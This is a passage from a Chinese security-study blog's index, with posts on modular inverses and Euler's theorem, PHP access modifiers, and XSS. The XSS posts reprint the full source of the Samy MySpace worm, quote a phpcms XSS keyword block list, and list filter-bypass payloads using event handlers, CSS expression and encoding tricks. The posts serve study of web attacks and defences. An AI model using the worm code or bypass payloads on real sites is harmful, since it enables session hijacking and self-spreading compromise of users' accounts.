1(mod n)，则称 x 的最小正整数解为 a 模 n的逆元。也就是说a和x的乘积模n得到的余数为1，</p>\n<p>关于它的作用及推导过程：<a href=\"https://blog.csdn.net/weixin_43872728/article/details/99687168\" target=\"_blank\" rel=\"noopener\">乘法逆元的作用</a></p>\n<h3 id=\"拓展欧几里得算法\"><a href=\"#拓展欧几里得算法\" class=\"headerlink\" title=\"拓展欧几里得算法\"></a>拓展欧几里得算法</h3><p>在已知a,b两个正整数和欧几里得求得最大公约数d=gcd(a,b)的基础上，存在整数x,y使得ax+by=d成立，也就是 ax+by=gcd(a，b)，如果a,b都是素数，则ax+by=1成立。</p>\n<p>python实现(求逆元)：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">myExtGCD</span><span class=\"params\">(a, b)</span>:</span></span><br><span class=\"line\">    <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">    a: 模的取值</span></span><br><span class=\"line\"><span class=\"string\">    b: 想求逆的值</span></span><br><span class=\"line\"><span class=\"string\">    \"\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (b == <span class=\"number\">0</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>, <span class=\"number\">0</span>, a</span><br><span class=\"line\">    x, y, gcd = myExtGCD(b, a % b)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> y, x-a//b*y, gcd</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(myExtGCD(<span class=\"number\">717</span>, <span class=\"number\">73</span>)[<span class=\"number\">1</span>] % <span class=\"number\">717</span>)</span><br></pre></td></tr></table></figure>\n\n<p>关于逆元的求解，也可直接导入gmpy2库的invert()函数，同样可得到结果，用法：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> gmpy2 <span class=\"keyword\">import</span> invert()</span><br><span class=\"line\"></span><br><span class=\"line\">ni = invert(a,b)</span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">a为想逆的值</span></span><br><span class=\"line\"><span class=\"string\">b为模的取值</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\">print(ni)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"费马小定理\"><a href=\"#费马小定理\" class=\"headerlink\" title=\"费马小定理\"></a>费马小定理</h3><p>当有两数a,p满足gcd(a,p)=1，p是质数时，则有 a^{p-1} = 1 (mod p)</p>\n<p>这里可以变形一下，a*a^{p-2} = 1(mod p)</p>\n<p>所以a^(p-2)就是a关于p的逆元，再用快速幂即可求得逆元(直接pow())</p>\n<h3 id=\"欧拉函数\"><a href=\"#欧拉函数\" class=\"headerlink\" title=\"欧拉函数\"></a>欧拉函数</h3><p>用希腊字母φ表示,φ(N)表示N的欧拉函数，通俗地理解为小于N且与N互质的数的个数(包含1).</p>\n<p>通式：φ(n)=n<em>(1-1/p1)</em>(1-1/p2)<em>(1-1/p3)</em>(1-1/p4)……(1-1/pn)</p>\n<p>(1)  p^k型:</p>\n<p>若N是质数p(即N=p), φ(n)= φ(p)=p-p^(k-1)=p-1。</p>\n<p>若N是质数p的k次幂(即N=p^k)，φ(n)=p^k-p^(k-1)=(p-1)p^(k-1)。</p>\n<p>(2)mn型</p>\n<p>设n为正整数，以φ(n)表示不超过n且与n互素的正整数的个数，称为n的欧拉函数值。若m,n互质，φ(mn)=(m-1)(n-1)=φ(m)φ(n)。</p>\n<h3 id=\"欧拉定理及推论\"><a href=\"#欧拉定理及推论\" class=\"headerlink\" title=\"欧拉定理及推论\"></a>欧拉定理及推论</h3><p>欧拉定理: 若正整数a，n互质，则a^{φ(n)}≡1 (mod n)，φ(n)为欧拉函数</p>\n<p>推论：若n=pq,p≠q都是素数,k是任意整数,则mk(p-1)(q-1)+1 ≡ m mod n</p>\n<p>​           对任意0≤m≤n，只要选择e,d，满足ed=kφ(n)+1，即ed ≡ 1 mod φ(n) ，d ≡ e-1 mod φ(n)</p>\n<p>待补充</p>\n<p>…</p>\n","categories":["密码学"],"tags":["crypto"]},{"title":"PHP中的public、protected、private","url":"/2020/05/26/note13/","content":"<p>区别一下public，protected和private</p>\n<a id=\"more\"></a>\n\n<h3 id=\"定义\"><a href=\"#定义\" class=\"headerlink\" title=\"定义\"></a>定义</h3><p>public，protected和private称为“访问修饰符”，可以通过在声明前加上这些关键字来定义属性，方法或常量的可见性。</p>\n<p>public：公有类型，可以在任何地方访问。</p>\n<p>protected：受保护类型，只能在类本身内以及继承和父类中访问。</p>\n<p>private：私有类型，只能由定义该成员的类访问。该类型的属性或方法只能在该类中使用，在该类的实例、子类中、子类的实例中都不能               调用私有类型的属性和方法</p>\n<p>举几个例子。</p>\n<p>1.Public</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">pub</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> $message = <span class=\"string\">\"你看见了我\"</span>;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">display</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;message.<span class=\"string\">\"&lt;br/&gt;\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//pub类的子类</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">child</span> <span class=\"keyword\">extends</span> <span class=\"title\">pub</span></span>&#123;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">show</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;message;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$obj = <span class=\"keyword\">new</span> child;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $obj-&gt;message.<span class=\"string\">\"&lt;/br&gt;\"</span>;</span><br><span class=\"line\">$obj-&gt;display();<span class=\"comment\">//类内</span></span><br><span class=\"line\">$obj-&gt;show();<span class=\"comment\">//子类</span></span><br><span class=\"line\">    <span class=\"comment\">//都可调用</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/image-20200526161822746.png\" alt=\"image-20200526161822746\"></p>\n<p>2.protected</p>\n<p>把public改成protected，编译器提示：</p>\n<p><img src=\"/images/image-20200526163125793.png\" alt=\"\"></p>\n<p> 通过父类类型的变量,是不允许访问protected成员的。只调用其本身和子类则正常输出。</p>\n<p><img src=\"/images/image-20200526165538604.png\" alt=\"image-20200526165538604\"></p>\n<p>3.private</p>\n<p>再改为private</p>\n<p><img src=\"/images/image-20200526165749359.png\" alt=\"image-20200526165749359\"></p>\n<p>只能由定义该成员的类访问，由于它只对类的内部成员可见，所以要利用它，一般都会是写一个public的方法，再返回这个属性。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">pri</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $a = <span class=\"string\">'self'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">test</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        $other = <span class=\"keyword\">new</span> <span class=\"keyword\">self</span>();</span><br><span class=\"line\">        $other-&gt;a = <span class=\"string\">'这样你才能看见我'</span>;</span><br><span class=\"line\">        var_dump($other-&gt;a);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$obj = <span class=\"keyword\">new</span> pri();</span><br><span class=\"line\">$obj-&gt;test();</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/image-20200526171317806.png\" alt=\"image-20200526171317806\"></p>\n","categories":["PHP"]},{"title":"xss学习日记(三）","url":"/2019/11/02/note3/","content":"<h3 id=\"XSS蠕虫\"><a href=\"#XSS蠕虫\" class=\"headerlink\" title=\"XSS蠕虫\"></a>XSS蠕虫</h3><h4 id=\"基本概念\"><a href=\"#基本概念\" class=\"headerlink\" title=\"基本概念\"></a>基本概念</h4><p>XSS蠕虫是指一种具有自我传播能力的XSS攻击，杀伤力很大。引发XSS蠕虫的条件比较高，需要在用户之间发生交互行为的页面，这样才能形成有效的传播。一般要同时结合反射型XSS和存储型XSS。（百度百科)<a id=\"more\"></a><br>当xss蠕虫与社会工程学相结合，其危害性将变得十分可怕（用户兴趣点及好奇心）。</p>\n<h4 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h4><p>1.攻击者发现一个网站存在XSS漏洞，并且可以编写xss蠕虫。<br>2.利用一个宿主（用户）作为传播源头进行xss攻击。<br>3.当其他用户访问被感染的内容（页面），xss蠕虫执行以下操作。<br>  A 判断用户是否登录，如果已经登陆就执行下一步，如果没有登录则执行其他操作。<br>  B 继续判断该用户是否被感染，如果没有就感染了他，如果感染了就跳过。</p>\n<h4 id=\"构建过程\"><a href=\"#构建过程\" class=\"headerlink\" title=\"构建过程\"></a>构建过程</h4><p>1.寻找XSS点<br>2。实现蠕虫行为<br>3.收集蠕虫数据<br>4.传播与感染<br>参考文章<a href=\"https://bbs.ichunqiu.com/thread-29149-1-1.html?from=db\" target=\"_blank\" rel=\"noopener\">https://bbs.ichunqiu.com/thread-29149-1-1.html?from=db</a></p>\n<h4 id=\"世界上第一个xss蠕虫病毒-里程碑\"><a href=\"#世界上第一个xss蠕虫病毒-里程碑\" class=\"headerlink\" title=\"世界上第一个xss蠕虫病毒(里程碑)\"></a>世界上第一个xss蠕虫病毒(里程碑)</h4><p>  2005年10月4日，第一个web2.0 蠕虫诞生，年仅19岁的samy发起了对myspace.com的xss worm攻击，下附其源代码，实现方法及原理分析参考文章<br>  <a href=\"https://www.freebuf.com/articles/web/19408.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/articles/web/19408.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">  &lt;div id=mycode style=<span class=\"string\">\"BACKGROUND:url('java </span></span><br><span class=\"line\"><span class=\"string\">script:eval(document.all.mycode.expr)')\"</span>expr=<span class=\"string\">\"var B=String.fromCharCode(34);varA=String.fromCharCode(39);function g()&#123;varC;try&#123;varD=document.body.createTextRange();C=D.htmlText&#125;catch(e)&#123;&#125;if(C)&#123;return</span></span><br><span class=\"line\"><span class=\"string\">C&#125;else&#123;return eval('document.body.inne'+'rHTML')&#125;&#125;function</span></span><br><span class=\"line\"><span class=\"string\">getData(AU)&#123;M=getFromURL(AU,'friendID');L=getFromURL(AU,'Mytoken')&#125;function getQueryParams()&#123;varE=document.location.search;var F=E.substring(1,E.length).split('&amp;');var AS=new Array();for(varO=0;O&lt;F.length;O++)&#123;varI=F[O].split('=');AS[I[0]]=I[1]&#125;return AS&#125;var J;varAS=getQueryParams();varL=AS['Mytoken'];varM=AS['friendID'];if(location.hostname=='profile.myspace.com')&#123;document.location='http://www.myspace.com'+location.pathname+location.search&#125;else&#123;if(!M)&#123;getData(g())&#125;main()&#125;functiongetClientFID()&#123;return findIn(g(),'up_launchIC( '+A,A)&#125;function nothing()&#123;&#125;functionparamsToString(AV)&#123;var N=new</span></span><br><span class=\"line\"><span class=\"string\">String();var O=0;for(var P</span></span><br><span class=\"line\"><span class=\"string\">in AV)&#123;if(O&gt;0)&#123;N+='&amp;'&#125;varQ=escape(AV[P]);while(Q.indexOf('+')!=-1)&#123;Q=Q.replace('+','%2B')&#125;while(Q.indexOf('&amp;')!=-1)&#123;Q=Q.replace('&amp;','%26')&#125;N+=P+'='+Q;O++&#125;return</span></span><br><span class=\"line\"><span class=\"string\">N&#125;function httpSend(BH,BI,BJ,BK)&#123;if(!J)&#123;return</span></span><br><span class=\"line\"><span class=\"string\">false&#125;eval('J.onr'+'eadystatechange=BI');J.open(BJ,BH,true);if(BJ=='POST')&#123;J.setRequestHeader('Content-Type','application/x-www-form-urlencoded');J.setRequestHeader('Content-Length',BK.length)&#125;J.send(BK);return</span></span><br><span class=\"line\"><span class=\"string\">true&#125;function findIn(BF,BB,BC)&#123;varR=BF.indexOf(BB)+BB.length;varS=BF.substring(R,R+1024);returnS.substring(0,S.indexOf(BC))&#125;functiongetHiddenParameter(BF,BG)&#123;return findIn(BF,'name='+B+BG+B+' value='+B,B)&#125;function getFromURL(BF,BG)&#123;var T;if(BG=='Mytoken')&#123;T=B&#125;else&#123;T='&amp;'&#125;var U=BG+'=';varV=BF.indexOf(U)+U.length;var W=BF.substring(V,V+1024);var X=W.indexOf(T);var Y=W.substring(0,X);return Y&#125;function getXMLObj()&#123;var Z=false;if(window.XMLHttpRequest)&#123;try&#123;Z=new XMLHttpRequest()&#125;catch(e)&#123;Z=false&#125;&#125;else</span></span><br><span class=\"line\"><span class=\"string\">if(window.ActiveXObject)&#123;try&#123;Z=new ActiveXObject('Msxml2.XMLHTTP')&#125;catch(e)&#123;try&#123;Z=newActiveXObject('Microsoft.XMLHTTP')&#125;catch(e)&#123;Z=false&#125;&#125;&#125;return</span></span><br><span class=\"line\"><span class=\"string\">Z&#125;var AA=g();var AB=AA.indexOf('m'+'ycode');var AC=AA.substring(AB,AB+4096);varAD=AC.indexOf('D'+'IV');var AE=AC.substring(0,AD);varAF;if(AE)&#123;AE=AE.replace('jav'+'a',A+'jav'+'a');AE=AE.replace('exp'+'r)','exp'+'r)'+A);AF='</span></span><br><span class=\"line\"><span class=\"string\">but most of all, samy is my hero. &lt;d'+'iv id='+AE+'D'+'IV&gt;'&#125;var AG;function getHome()&#123;if(J.readyState!=4)&#123;return&#125;varAU=J.responseText;AG=findIn(AU,'P'+'rofileHeroes','&lt;/td&gt;');AG=AG.substring(61,AG.length);if(AG.indexOf('samy')==-1)&#123;if(AF)&#123;AG+=AF;var</span></span><br><span class=\"line\"><span class=\"string\">AR=getFromURL(AU,'Mytoken');var</span></span><br><span class=\"line\"><span class=\"string\">AS=new</span></span><br><span class=\"line\"><span class=\"string\">Array();AS['interestLabel']='heroes';AS['submit']='Preview';AS['interest']=AG;J=getXMLObj();httpSend('/index.cfm?fuseaction=profile.previewInterests&amp;Mytoken='+AR,postHero,'POST',paramsToString(AS))&#125;&#125;&#125;functionpostHero()&#123;if(J.readyState!=4)&#123;return&#125;var AU=J.responseText;var AR=getFromURL(AU,'Mytoken');var</span></span><br><span class=\"line\"><span class=\"string\">AS=new</span></span><br><span class=\"line\"><span class=\"string\">Array();AS['interestLabel']='heroes';AS['submit']='Submit';AS['interest']=AG;AS['hash']=getHiddenParameter(AU,'hash');httpSend('/index.cfm?fuseaction=profile.processInterests&amp;Mytoken='+AR,nothing,'POST',paramsToString(AS))&#125;function</span></span><br><span class=\"line\"><span class=\"string\">main()&#123;var AN=getClientFID();varBH='/index.cfm?fuseaction=user.viewProfile&amp;friendID='+AN+'&amp;Mytoken='+L;J=getXMLObj();httpSend(BH,getHome,'GET');xmlhttp2=getXMLObj();httpSend2('/index.cfm?fuseaction=invite.addfriend_verify&amp;friendID=11851658&amp;Mytoken='+L,processxForm,'GET')&#125;functionprocessxForm()&#123;if(xmlhttp2.readyState!=4)&#123;return&#125;var AU=xmlhttp2.responseText;var AQ=getHiddenParameter(AU,'hashcode');var AR=getFromURL(AU,'Mytoken');var</span></span><br><span class=\"line\"><span class=\"string\">AS=new</span></span><br><span class=\"line\"><span class=\"string\">Array();AS['hashcode']=AQ;AS['friendID']='11851658';AS['submit']='Add to</span></span><br><span class=\"line\"><span class=\"string\">Friends';httpSend2('/index.cfm?fuseaction=invite.addFriendsProcess&amp;Mytoken='+AR,nothing,'POST',paramsToString(AS))&#125;function</span></span><br><span class=\"line\"><span class=\"string\">httpSend2(BH,BI,BJ,BK)&#123;if(!xmlhttp2)&#123;return</span></span><br><span class=\"line\"><span class=\"string\">false&#125;eval('xmlhttp2.onr'+'eadystatechange=BI');xmlhttp2.open(BJ,BH,true);if(BJ=='POST')&#123;xmlhttp2.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xmlhttp2.setRequestHeader('Content-Length',BK.length)&#125;xmlhttp2.send(BK);return</span></span><br><span class=\"line\"><span class=\"string\">true&#125;\"</span>&gt;&lt;/DIV&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n","categories":["web安全"],"tags":["xss"]},{"title":"xss学习日记(二）","url":"/2019/11/01/note2/","content":"<h2 id=\"xss构造剖析\"><a href=\"#xss构造剖析\" class=\"headerlink\" title=\"xss构造剖析\"></a>xss构造剖析</h2><h4 id=\"1-XSS-filter\"><a href=\"#1-XSS-filter\" class=\"headerlink\" title=\"1.XSS-filter\"></a>1.XSS-filter</h4><p>为了防御跨站脚本攻击。开发人员会在web应用中设计一个XSS Filter,即<strong>跨站脚本过滤器</strong>，用于分析用户提交的输入，并消除潜在的跨站脚本攻击，恶意的HTML或简单的HTML格式错误等<a id=\"more\"></a><br>它实际上是一段精心编写的过滤函数，下列是phpcms中的过滤代码文件global.func.php中的一段代码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">    <span class=\"variable\">$parm1</span> = Array(<span class=\"string\">'javascript'</span>, <span class=\"string\">'vbscript'</span>, <span class=\"string\">'expression'</span>, <span class=\"string\">'applet'</span>, <span class=\"string\">'meta'</span>, <span class=\"string\">'xml'</span>, <span class=\"string\">'blink'</span>, <span class=\"string\">'link'</span>, <span class=\"string\">'script'</span>, <span class=\"string\">'embed'</span>, <span class=\"string\">'object'</span>, <span class=\"string\">'iframe'</span>, <span class=\"string\">'frame'</span>, <span class=\"string\">'frameset'</span>, <span class=\"string\">'ilayer'</span>, <span class=\"string\">'layer'</span>, <span class=\"string\">'bgsound'</span>, <span class=\"string\">'title'</span>, <span class=\"string\">'base'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$parm2</span> = Array(<span class=\"string\">'onabort'</span>, <span class=\"string\">'onactivate'</span>, <span class=\"string\">'onafterprint'</span>, <span class=\"string\">'onafterupdate'</span>, <span class=\"string\">'onbeforeactivate'</span>, <span class=\"string\">'onbeforecopy'</span>, <span class=\"string\">'onbeforecut'</span>, <span class=\"string\">'onbeforedeactivate'</span>, <span class=\"string\">'onbeforeeditfocus'</span>, <span class=\"string\">'onbeforepaste'</span>, <span class=\"string\">'onbeforeprint'</span>, <span class=\"string\">'onbeforeunload'</span>, <span class=\"string\">'onbeforeupdate'</span>, <span class=\"string\">'onblur'</span>, <span class=\"string\">'onbounce'</span>, <span class=\"string\">'oncellchange'</span>, <span class=\"string\">'onchange'</span>, <span class=\"string\">'onclick'</span>, <span class=\"string\">'oncontextmenu'</span>, <span class=\"string\">'oncontrolselect'</span>, <span class=\"string\">'oncopy'</span>, <span class=\"string\">'oncut'</span>, <span class=\"string\">'ondataavailable'</span>, <span class=\"string\">'ondatasetchanged'</span>, <span class=\"string\">'ondatasetcomplete'</span>, <span class=\"string\">'ondblclick'</span>, <span class=\"string\">'ondeactivate'</span>, <span class=\"string\">'ondrag'</span>, <span class=\"string\">'ondragend'</span>, <span class=\"string\">'ondragenter'</span>, <span class=\"string\">'ondragleave'</span>, <span class=\"string\">'ondragover'</span>, <span class=\"string\">'ondragstart'</span>, <span class=\"string\">'ondrop'</span>, <span class=\"string\">'onerror'</span>, <span class=\"string\">'onerrorupdate'</span>, <span class=\"string\">'onfilterchange'</span>, <span class=\"string\">'onfinish'</span>, <span class=\"string\">'onfocus'</span>, <span class=\"string\">'onfocusin'</span>, <span class=\"string\">'onfocusout'</span>, <span class=\"string\">'onhelp'</span>, <span class=\"string\">'onkeydown'</span>, <span class=\"string\">'onkeypress'</span>, <span class=\"string\">'onkeyup'</span>, <span class=\"string\">'onlayoutcomplete'</span>, <span class=\"string\">'onload'</span>, <span class=\"string\">'onlosecapture'</span>, <span class=\"string\">'onmousedown'</span>, <span class=\"string\">'onmouseenter'</span>, <span class=\"string\">'onmouseleave'</span>, <span class=\"string\">'onmousemove'</span>, <span class=\"string\">'onmouseout'</span>, <span class=\"string\">'onmouseover'</span>, <span class=\"string\">'onmouseup'</span>, <span class=\"string\">'onmousewheel'</span>, <span class=\"string\">'onmove'</span>, <span class=\"string\">'onmoveend'</span>, <span class=\"string\">'onmovestart'</span>, <span class=\"string\">'onpaste'</span>, <span class=\"string\">'onpropertychange'</span>, <span class=\"string\">'onreadystatechange'</span>, <span class=\"string\">'onreset'</span>, <span class=\"string\">'onresize'</span>, <span class=\"string\">'onresizeend'</span>, <span class=\"string\">'onresizestart'</span>, <span class=\"string\">'onrowenter'</span>, <span class=\"string\">'onrowexit'</span>, <span class=\"string\">'onrowsdelete'</span>, <span class=\"string\">'onrowsinserted'</span>, <span class=\"string\">'onscroll'</span>, <span class=\"string\">'onselect'</span>, <span class=\"string\">'onselectionchange'</span>, <span class=\"string\">'onselectstart'</span>, <span class=\"string\">'onstart'</span>, <span class=\"string\">'onstop'</span>, <span class=\"string\">'onsubmit'</span>, <span class=\"string\">'onunload'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$parm</span> = array_merge(<span class=\"variable\">$parm1</span>, <span class=\"variable\">$parm2</span>); </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">for</span> (<span class=\"variable\">$i</span> = 0; <span class=\"variable\">$i</span> &lt; sizeof(<span class=\"variable\">$parm</span>); <span class=\"variable\">$i</span>++) &#123; </span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"variable\">$pattern</span> = <span class=\"string\">'/'</span>; </span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">for</span> (<span class=\"variable\">$j</span> = 0; <span class=\"variable\">$j</span> &lt; strlen(<span class=\"variable\">$parm</span>[<span class=\"variable\">$i</span>]); <span class=\"variable\">$j</span>++) &#123; </span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">if</span> (<span class=\"variable\">$j</span> &gt; 0) &#123; </span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"variable\">$pattern</span> .= <span class=\"string\">'('</span>; </span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"variable\">$pattern</span> .= <span class=\"string\">'(&amp;#[x|X]0([9][a][b]);?)?'</span>; </span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"variable\">$pattern</span> .= <span class=\"string\">'|(&amp;#0([9][10][13]);?)?'</span>; </span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"variable\">$pattern</span> .= <span class=\"string\">')?'</span>; </span><br><span class=\"line\"></span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"variable\">$pattern</span> .= <span class=\"variable\">$parm</span>[<span class=\"variable\">$i</span>][<span class=\"variable\">$j</span>]; </span><br><span class=\"line\"></span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"variable\">$pattern</span> .= <span class=\"string\">'/i'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"variable\">$string</span> = preg_replace(<span class=\"variable\">$pattern</span>, <span class=\"string\">' '</span>, <span class=\"variable\">$string</span>); </span><br><span class=\"line\"></span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"built_in\">return</span> <span class=\"variable\">$string</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这段代码的作用是过滤XSS跨站代码，程序在处理输入变量时使用该函数，就可过滤常见的跨站脚本。<br>但它依旧存在被绕过的可能，下列从攻的角度展示一些绕过XSS Filter的测试用例。</p>\n<h4 id=\"1-利用-lt-gt-标记注射Html-Javascript\"><a href=\"#1-利用-lt-gt-标记注射Html-Javascript\" class=\"headerlink\" title=\"(1)利用&lt;&gt;标记注射Html/Javascript\"></a>(1)利用&lt;&gt;标记注射Html/Javascript</h4><p>如<code>&lt;script&gt;alert;&lt;/script&gt;或&lt;script&gt;shellcode&lt;/script&gt;</code><br>因此，XSS Filter最先要进行过滤和转义的就是“&lt;&gt;”和<code>&lt;script&gt;</code>等字符。</p>\n<h6 id=\"2-利用HTML标签属性值执行XSS。\"><a href=\"#2-利用HTML标签属性值执行XSS。\" class=\"headerlink\" title=\"(2)利用HTML标签属性值执行XSS。\"></a>(2)利用HTML标签属性值执行XSS。</h6><p>如下代码:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;table background=<span class=\"string\">\"javescript:alert(/XSS/)\"</span>&gt;&lt;/table&gt;</span><br><span class=\"line\">&lt;img scr=<span class=\"string\">\"javescript:alert('XSS')\"</span>&gt;</span><br></pre></td></tr></table></figure>\n<p>在IE6浏览器中运行上述代码会弹出对话框，即攻击成功，但它具有一定的局限性，即只能在支持javascript:[code]伪协议的浏览器运行。<br>通常只有引用文件的属性才能触发跨站脚本，我们可以使用以下属性来测试XSS</p>\n<p>href=</p>\n<p>lowsrc=</p>\n<p>bgsound=</p>\n<p>background=</p>\n<p>value=</p>\n<p>action=</p>\n<p>dynsrc=<br>所以，要防御基于属性值的XSS，就要过滤javascript等关键字，另外还有其他允许值如Vbscript<br>（3）空格回车Tab</p>\n<p>XSS Filter把敏感的输入字符列入黑名单处理，可以利用空格、回车和Tab键绕过 例：</p>\n<p>&lt;img src=”javas</p>\n<p>script:</p>\n<p>alert(/xss/)”&gt;</p>\n<h4 id=\"4）对标签属性值转码\"><a href=\"#4）对标签属性值转码\" class=\"headerlink\" title=\"(4）对标签属性值转码\"></a>(4）对标签属性值转码</h4><p>对普通HTML标记的属性值过滤，还可以通过编码处理来绕过。</p>\n<p>Tab符的ASCII码&amp;#9、换行符&amp;#10、回车符&amp;#13可以插入任意地方</p>\n<p>为了防范标签纸属性编码的XSS，最好也过滤&amp;#/等字符</p>\n<h4 id=\"5）产生自己的事件\"><a href=\"#5）产生自己的事件\" class=\"headerlink\" title=\"(5）产生自己的事件\"></a>(5）产生自己的事件</h4><p>不能依靠属性值跨站，通过事件，如click、mouseover、load等，响应事件的函数叫事件处理函数例：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;img src=<span class=\"string\">\"#\"</span> onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>\n\n<p>onerror是IMG标记的一个事件，页面发生错误，该事件被激活。上例，解释IMG标记时，加载src属性引用的图片地址，若图片不存在就触发onerror事件。其他事件：onResume</p>\n<p>onReverse</p>\n<p>onRowDelete</p>\n<p>onRowInseted<br>等</p>\n<h4 id=\"6）利用CSS跨站\"><a href=\"#6）利用CSS跨站\" class=\"headerlink\" title=\"(6）利用CSS跨站\"></a>(6）利用CSS跨站</h4><p>CSS中使用expression同样可以触发XSS。例：</p>\n<div style=\"width: expression(alert('xss'));\">\n\n<p>脚本代码通常被嵌入到style标签/属性中。style属性可以和任意字符的标签结合，所以不只要过滤标签，还必须对style属性值进行过滤。</p>\n<p>例:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;div style=<span class=\"string\">\"list-style-image:url(javascript:alert(‘xss’))\"</span>&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;img style=<span class=\"string\">\"background-image:url(javascript：alert('xss'))\"</span>&gt;  等同于</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;img src=<span class=\"string\">\" javascript:alert('xss')\"</span>&gt;</span><br></pre></td></tr></table></figure>\n<p>此外，可以使用<link>标签引用CSS，除<link>标签外，网页中引用外部CSS还可以利用@import导入，例：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;style <span class=\"built_in\">type</span>=<span class=\"string\">'test/css'</span>/&gt;import url(http://.../xss.css);&lt;/style&gt;</span><br></pre></td></tr></table></figure>\n<p>@import还可以直接执行JS代码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;style&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">@import <span class=\"string\">'javascript:alert(\"xss\")'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;/style&gt;</span><br></pre></td></tr></table></figure>\n<p>因此，包含expression、javascript、import等敏感字符的样式表也要进行过滤。</p>\n<h4 id=\"7）扰乱过滤规则\"><a href=\"#7）扰乱过滤规则\" class=\"headerlink\" title=\"(7）扰乱过滤规则\"></a>(7）扰乱过滤规则</h4><p>转换大小写、大小写混淆、不用双引号用单引号、不使用引号。IMG标记和src属性之间没有空格</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;img/src=<span class=\"string\">\"javascript:alert('xss');\"</span>&gt;</span><br></pre></td></tr></table></figure>\n<p>利用expression跨站时，可以构造不同的全角字符。<br>运用/**/来注释字符，样式标签中的\\和结束符\\0。<br>将CSS关键字转码，e转\\65，改变编码中0的数量\\065、\\0065<br>利用浏览器解析HTML注释存在的问题来执行JS，例：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!--&lt;img src=<span 